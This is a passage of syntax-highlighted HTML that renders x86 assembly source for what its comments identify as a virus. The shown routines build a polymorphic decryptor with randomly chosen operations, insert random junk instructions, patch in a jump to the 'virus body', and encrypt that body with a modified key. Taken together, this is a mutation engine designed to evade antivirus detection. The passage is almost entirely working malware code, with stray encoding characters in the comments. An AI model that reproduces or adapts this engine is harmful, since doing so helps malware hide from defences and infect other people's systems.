       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@107</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@107</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">preg</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@108</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11111000b</span><span class="sc0">    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@108</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lreg</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@109</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11111000b</span><span class="sc0">      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@109</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">op1</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;нchoose randomly the</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">;нthree operations</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@105</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">op2</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@104</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000111b</span><span class="sc0">    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@104</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">op2</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@106</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000111b</span><span class="sc0">    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@106</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@100</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;нnow move the instruct.</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">address2</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;нand generate junk...</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">instr_len</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">makejunk</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">move_decryptor</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;нget instruction length</span><span class="sc0">
       </span><span class="sc6">jcxz</span><span class="sc0"> </span><span class="sc5">done_move</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;нmove it!</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_case</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">save</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">no_case</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11d</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_junk</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">makejunk</span><span class="sc0">                   </span><span class="sc1">;нdo junk!</span><span class="sc0">
</span><span class="sc5">no_junk</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">move_decryptor</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">done_move</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">save</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">address2</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;нfill in the jump to</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;нvirus body</span><span class="sc0">
       </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">poly_code_start</span><span class="sc4">-</span><span class="sc5">poly_decryptor</span><span class="sc0">     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_code_start</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">value</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;нnow prepare the</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@200</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;нencryptor to make the</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">keymodif</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;нencryption of the code</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@202</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">unop1</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index1</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@201</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">unop2</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index2</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@200</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000111b</span><span class="sc0">    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@200</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">op2</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index3</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@202</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000111b</span><span class="sc0">    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@202</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">address1</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">polykey</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">length</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">encrypt_poly</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;нencrypt the code!</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">@201</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">@200</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">@202</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">encrypt_poly</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">makejunk</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;нhere we make some</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;нrandom amount of junk</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">junk_loop</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFEh</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">junk_loop</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
